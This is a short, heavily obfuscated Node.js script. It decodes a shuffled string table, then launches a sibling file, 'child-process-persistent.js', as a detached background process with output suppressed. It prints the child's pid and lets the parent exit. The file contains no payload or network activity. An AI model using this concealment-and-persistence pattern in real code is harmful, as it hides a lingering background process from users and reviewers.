const _0x423b = [
    '742405iremqQ',
    '119057PNxQKt',
    'child_process',
    'spawn',
    'path',
    'join',
    'execPath',
    'ignore',
    'log',
    'pid',
    'unref',
    '831990oBjPwK',
    '968kFrzUA',
    '934BMSJBF',
    '17131ufSIjB',
    '73ebDdht',
    '370487iKSxNd',
    '3TqOcmm',
    '229703ZkAltL'
];
const _0x59cc83 = _0x4c74;
(function (_0x73a816, _0x419c8a) {
    const _0x21073a = _0x4c74;
    while (!![]) {
        try {
            const _0x47f23f = -parseInt(_0x21073a(0x1da)) + -parseInt(_0x21073a(0x1db)) * parseInt(_0x21073a(0x1dc)) + -parseInt(_0x21073a(0x1dd)) * -parseInt(_0x21073a(0x1de)) + -parseInt(_0x21073a(0x1df)) + parseInt(_0x21073a(0x1e0)) * parseInt(_0x21073a(0x1e1)) + parseInt(_0x21073a(0x1e2)) + parseInt(_0x21073a(0x1e3));
            if (_0x47f23f === _0x419c8a)
                break;
            else
                _0x73a816['push'](_0x73a816['shift']());
        } catch (_0x139289) {
            _0x73a816['push'](_0x73a816['shift']());
        }
    }
}(_0x423b, 0xa9911));
const spawn = require(_0x59cc83(0x1e4))[_0x59cc83(0x1e5)], path = require(_0x59cc83(0x1e6)), childPath = path[_0x59cc83(0x1e7)](__dirname, 'child-process-persistent.js');
function _0x4c74(_0x1c2508, _0x445dc0) {
    return _0x4c74 = function (_0x423b42, _0x4c7428) {
        _0x423b42 = _0x423b42 - 0x1da;
        let _0x476a5a = _0x423b[_0x423b42];
        return _0x476a5a;
    }, _0x4c74(_0x1c2508, _0x445dc0);
}
var child = spawn(process[_0x59cc83(0x1e8)], [childPath], {
    'detached': !![],
    'stdio': _0x59cc83(0x1e9)
});
console[_0x59cc83(0x1ea)](child[_0x59cc83(0x1eb)]), child[_0x59cc83(0x1ec)]();
